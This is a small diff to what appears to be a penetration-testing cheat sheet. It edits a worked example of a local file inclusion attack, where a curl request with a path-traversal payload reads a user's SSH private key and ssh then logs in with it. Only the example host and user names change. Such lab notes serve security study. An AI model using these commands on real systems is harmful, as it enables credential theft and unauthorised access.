@@ -21,9 +21,9 @@ Keys:
 
 ## Example LFI to keygrab
 ```
-kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
 kali@kali:~$ chmod 400 dt_key
-kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+kali@kali:~$ ssh -i dt_key -p 2222 user@valleys.com
 ```
 
 ## Fuzzing
